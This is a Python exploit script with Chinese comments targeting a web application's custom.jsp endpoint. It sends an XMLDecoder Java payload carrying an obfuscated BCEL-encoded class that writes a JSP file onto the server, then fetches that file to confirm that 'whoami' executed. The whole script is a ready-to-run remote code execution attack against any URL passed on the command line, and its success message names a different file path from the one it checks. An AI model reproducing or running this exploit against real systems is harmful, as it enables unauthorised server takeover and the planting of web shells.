import requests
import sys
#本脚本只上传执行whoami命令的文件

def GetShell(urllist):
    url = urllist+"/sys/ui/extend/varkind/custom.jsp"
    flag ='whoami'
    headers = {"Accept": "text/html,application/xhtml xml,application/xml;q=0.9,*/*;q=0.8", "Accept-Language": "zh-cn", "Accept-Encoding": "gzip, deflate", "Origin": "null", "Connection": "close", "Upgrade-Insecure-Requests": "1", "Content-Type": "application/x-www-form-urlencoded"}
    data = {"var": "{\"body\":{\"file\":\"/sys/search/sys_search_main/sysSearchMain.do?method=editParam\"}}", "fdParemNames": "11", "fdParameters": "<java><void class=\"com.sun.org.apache.bcel.internal.util.ClassLoader\"><void method=\"loadClass\"><string>$$BCEL$$$l$8b$I$A$A$A$A$A$A$A$85UiW$dbF$U$bd$C$h$ZG$J$89$J$E$924i$d2$a6$n$L$d8l$n$E$9246$G$M$G$8cm$yL$da$a6$da$90$E$b2$a4jai$fb$7f$fa9_LO9$a7$3f$a0$7f$a8$dfz$faF$Ok$dd$W$lfys$e7$be$f7$ee$cc$3c$fd$f1$d7o$bf$D$Y$c7$cfI$dc$c7$M$8f$d9$q$3a0$93$c4k$bca$cd$db$E$beN$e2$j$b2I$e40$97D$k$f3I$y$601$89$C$96x$y$f3$u$sq$V3$J$ac$q1$80U6YK$a0$c4$fa$f5$q$E$94$T$a8$f0$a8$s$d1$cf$d87X_K$40d$e0M$b6$5eg$cd$W$8f$f7$3c$be$e1$d05k$daf$f0$86C$e7$d0$93$g$87X$ceQ5$O$3dE$d3$d6V$c3$86$acyUI$b6$c8$92$w$3a$8ad$d5$q$cfd$f3O$c6X$60$98$3e$87x$b1$9c$cb$cfpH$e6$P$U$cd$NL$c7$sc$ac$n$996$87$fe$a1$f7$c5$jiOJ$5b$92$ad$a7$x$81g$da$faL$e4I$f2t$82$f5$b6Y$e6$90$98U$ac$93$b8$U$8b$607$ce$a1r$96$e4$fb$E$8a$b9R$60$b0$c8$da$Q$I$$$N$C$d13$D$cd$h$e3$d0$d7$c2$98N$batf$tX$dc74$cb$e2$c0$ab$9aB$89$7b$i$G$8a$7eh$a7$h$a6$af$a4$b3$ef$w$f9$X$Ts$ad$V$c6$d9$C$b5$7cp$b8Z$J$qewEr$p1HO$S$a0$e2$84$9e$a2$cd$9bL$9c$E$892$c2$dc$K$f8$i$P$u$R$9a$f3$f8V$c0w$f8$m$e0$7bH$q$b3$ec$h$p$F$9bbq$3d$8dZ$k$b2$A$F$w$PM$c06t$k$86$A$T$3b$3cv$FXh$f0$b0$F8pI$b66$f9p$b8uY$89lhZQZ$bc$98$cf$O$XV$e7$F$fc$AO$80$8f$80$c35$cb$d1M$fb$83e$fa$c1$c8$8e$ef$K$I$e1$b2X$f78$$S$cam$e8$da$98k$a8$8d$7c$u$89$_$c3$8a8$b9$afn$96$ab$ea$e2$92U$X3$ba$qN$e8$a5J$b6$a2$8a$93$ZI$i$b5$8a$N$d5R$e7$97Fe$bb$ec$ca$e2$86$b3$5c$99$b4$b4$85$da$cerni$5cZ$986dq$d7$q$9b$bd$b5Y$5e$92$ed$ec$a8$3a$bf$9aQ$g5C$ae$e8$ee$da$98$V$aa$b9$acQ$98$cb$e8$c5j$7e$aan$5b$99$adZ$a0$W$W$K$ccG$b8$b5$a9$e8$z$9b$7f$b82$b7$3e$b1Y$N$f6$d4$cd$f5PY$5cre$7b$dd$v$ec$i$ec$x$8d$8dg$FswJ$j3$5cy$81$fc$_$e4$a7$v$c6$90$f9$d8$ca$Z$e4$7b$d7$uU2$H$cb$9b$e7$f7$96$7d$d9$d4M$da$b3W$XG$dd5$b3$e0$c9$8d$dax$n$8a$cd$K$b7$O$a3$7dS$db$e2$f4$a8$9a$9b$dcg65$a7$9b$a5$dc$f4$a9$bf$ed$ca$3b$ab$a4$bf$7eM$X$bd$fd$bd$e1p$fd$f2$a1$I$d8$c7$B$dd$bd$8d$ea$fc$f0K$s$f8$a1$80$l$b1$t$e0$tvMz$cf$e0$a7$cf$e9$C$c9$9a$bc$a3$v$c1$FS$d5$f04I$a5$x$a9$84$9e$a7$d9$c1$c9$fc$e6$d0$93$e2e$U$5d$e4$3e$5d$Lr$O$5d$bb$83$mzKEG$8a$o$j$bc$A$3f$b7$c4$f6$b4$5d$e0$d0m$d1$m$b2px4$d4$e6$a9$b7y$b8$3d$97L$944ET$f2$9c$80$S$a3t$e7$9cV$edxx$S$8f$afQbfp$98$be$8c$n$b2$7b$ff$8d$mQ$a2l$e9$ddFo$93$c3$dd$7f$b0$9e$ad$S$df$c0$bf$adq$b8BL$ac$M$7e$3a$92$T$k$5b$L$d2$h$e5$o$ab$Q$e7$e7$f4$e8XVQ$8d$bax$Q$a7U$w$ee$bb$96IG$f9$b8$9dpm$Lc$97$e4$ba$9aMG$3b$fc$3fZ_x$ff$ac$a2$G$ceI$e1$eak$b7$b5vZ$df$b2$e1$f66$3b$d9$fe$b6Ae$a9$ca$M$bd$cf$b6g$e0$a3$aak$918q$c5r$7c$N$P$e8$d3v$l$ec$af$T$i$x$834$7f$Y$7d$fd8$fa$B$f1$a7G$e0$3e$d2$a0$D_P$cb$be$84dD$M$5d$f8$92FB$L$84G$f8$8a$fa$c7$f4$l$p$cb$3dtc$IO$3eQMQ$cfP$dd$c7$e8$a8$l$a1S$bcL$d7$8d$E$8d$ce$e8$ba$f1$U$cf$$$d0$r$f0$9c$o$e3$Y$j$d7I$ee$bah$c5$f8$V$b1$s$e2$a9$ae$s$f8$e5$a7M$q$9a$e8n$o$d9$c4$95$e21$84$fa1$ae$92$b3k$cfR$3dM$5c$ef$ik$e2F$wEM$T$bdG$b8$b9$92$ea$5b$3dF$3f$Bn$bd$8a$jc$a0$3e$Y$hnb0u$fb$Iw$5e$c5$9f$P$c6$9b$b8$fb$bc$89$cf$7eAl$f9c$U$93B$d5$fe$ki$c4$a2$k$c1$Vj$afQ$b4$3d$b8$8d$eb$98$c5$N$bcE$K$8b$e8E$j7$f1$B$7d$84$bfE$3b$fa$a1c0$ca$ec$N$c5$y$40$c40$ed$G$ed$w$m$8d$M1$cfR$96$a3$Y$p$j$de$Sn$9cl$9d$c4s$H$T$98$a4$dc$eb$a4$cb$L$b2$c5ID$a6K$c7$9f$d8$e6$f1$92T$c0t$q$e2$ab$bf$B9$7c$91$df$ad$I$A$A</string><void method=\"newInstance\"></void></void></void></java>\r\n"}
    requests.post(url, headers=headers, data=data)
    listshell = urllist+"/login_123.jsp"
    listshellr = requests.get(url=listshell)


    if listshellr.status_code == 200 and flag in listshellr.text:
        print(urllist+" 文件上传成功，地址为："+urllist+"/login_list.jsp"+"\n")
        print("成功执行命令"+listshellr.text)
    else:
        print("文件上传成功失败--请手动验证")


def main():
    if (len(sys.argv) == 2):
        url = sys.argv[1]
        GetShell(url)
    else:
        print("python3 rce.py http://xx.xx.xx.xx")

if __name__ == '__main__':
    main()
